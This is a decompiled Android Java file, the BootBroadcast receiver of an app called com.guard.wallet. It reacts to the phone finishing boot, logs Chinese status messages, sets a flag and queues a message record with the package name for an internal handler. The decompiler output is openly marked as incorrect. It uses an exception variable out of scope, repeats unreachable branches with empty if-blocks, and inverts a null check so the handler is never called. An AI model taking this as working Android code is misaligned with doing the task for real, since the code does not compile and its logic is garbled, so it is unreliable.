package com.guard.wallet.receiver;

import a1.AbstractC0026q;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.UserManager;
import android.util.Log;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.BootEventVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.utils.AbstractC0252h;
import p019w.AbstractC0957b;

/* loaded from: classes.dex */
public class BootBroadcast extends BroadcastReceiver {

    /* renamed from: a */
    public Integer f277a = 0;

    /* JADX WARN: Removed duplicated region for block: B:15:0x0041  */
    /* JADX WARN: Removed duplicated region for block: B:19:0x0096 A[Catch: Exception -> 0x00ac, TryCatch #0 {Exception -> 0x00ac, blocks: (B:3:0x0003, B:5:0x000b, B:7:0x0015, B:16:0x0044, B:17:0x006a, B:19:0x0096, B:21:0x00a0, B:27:0x004d, B:29:0x0063, B:30:0x0028, B:33:0x0032), top: B:2:0x0003 }] */
    /* JADX WARN: Removed duplicated region for block: B:26:? A[ADDED_TO_REGION, RETURN, SYNTHETIC] */
    /* JADX WARN: Removed duplicated region for block: B:27:0x004d A[Catch: Exception -> 0x00ac, TryCatch #0 {Exception -> 0x00ac, blocks: (B:3:0x0003, B:5:0x000b, B:7:0x0015, B:16:0x0044, B:17:0x006a, B:19:0x0096, B:21:0x00a0, B:27:0x004d, B:29:0x0063, B:30:0x0028, B:33:0x0032), top: B:2:0x0003 }] */
    @Override // android.content.BroadcastReceiver
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public final void onReceive(Context context, Intent intent) {
        char c;
        try {
            this.f277a = 1;
        } catch (Exception e2) {
            AbstractC0026q.m186s("BootBroadcast", e2);
        }
        if (intent == null || AbstractC0026q.m151B(intent.getAction())) {
            return;
        }
        String action = intent.getAction();
        int hashCode = action.hashCode();
        if (hashCode != -905063602) {
            if (hashCode == 798292259 && action.equals("android.intent.action.BOOT_COMPLETED")) {
                c = 0;
                if (c != 0) {
                    Log.d("BootBroadcast", "手机开机了 ");
                    AbstractC0957b.m1444a();
                    if (((UserManager) context.getSystemService("user")).isUserUnlocked()) {
                        AbstractC0252h.m683D(1, "has_receive_completed");
                    }
                } else if (c == 1) {
                    Log.d("BootBroadcast", "手机开机了,没有解锁");
                    AbstractC0957b.m1444a();
                }
                MessageRecordVO messageRecordVO = new MessageRecordVO();
                BootEventVO bootEventVO = new BootEventVO();
                bootEventVO.setPackageName(context.getPackageName());
                bootEventVO.setHasReceiveCompleted(Integer.valueOf(AbstractC0252h.m705i("has_receive_completed")));
                messageRecordVO.setIntentCode(intent.getAction());
                messageRecordVO.setExtraBody(bootEventVO);
                if (MainApplication.getInstance() != null || MainApplication.getInstance().getHandlerMsgAndTimer() == null) {
                    return;
                }
                MainApplication.getInstance().getHandlerMsgAndTimer().m579b(messageRecordVO);
                return;
            }
            c = 65535;
            if (c != 0) {
            }
            MessageRecordVO messageRecordVO2 = new MessageRecordVO();
            BootEventVO bootEventVO2 = new BootEventVO();
            bootEventVO2.setPackageName(context.getPackageName());
            bootEventVO2.setHasReceiveCompleted(Integer.valueOf(AbstractC0252h.m705i("has_receive_completed")));
            messageRecordVO2.setIntentCode(intent.getAction());
            messageRecordVO2.setExtraBody(bootEventVO2);
            if (MainApplication.getInstance() != null) {
                return;
            } else {
                return;
            }
        }
        if (action.equals("android.intent.action.LOCKED_BOOT_COMPLETED")) {
            c = 1;
            if (c != 0) {
            }
            MessageRecordVO messageRecordVO22 = new MessageRecordVO();
            BootEventVO bootEventVO22 = new BootEventVO();
            bootEventVO22.setPackageName(context.getPackageName());
            bootEventVO22.setHasReceiveCompleted(Integer.valueOf(AbstractC0252h.m705i("has_receive_completed")));
            messageRecordVO22.setIntentCode(intent.getAction());
            messageRecordVO22.setExtraBody(bootEventVO22);
            if (MainApplication.getInstance() != null) {
            }
        }
        c = 65535;
        if (c != 0) {
        }
        MessageRecordVO messageRecordVO222 = new MessageRecordVO();
        BootEventVO bootEventVO222 = new BootEventVO();
        bootEventVO222.setPackageName(context.getPackageName());
        bootEventVO222.setHasReceiveCompleted(Integer.valueOf(AbstractC0252h.m705i("has_receive_completed")));
        messageRecordVO222.setIntentCode(intent.getAction());
        messageRecordVO222.setExtraBody(bootEventVO222);
        if (MainApplication.getInstance() != null) {
        }
        AbstractC0026q.m186s("BootBroadcast", e2);
    }
}
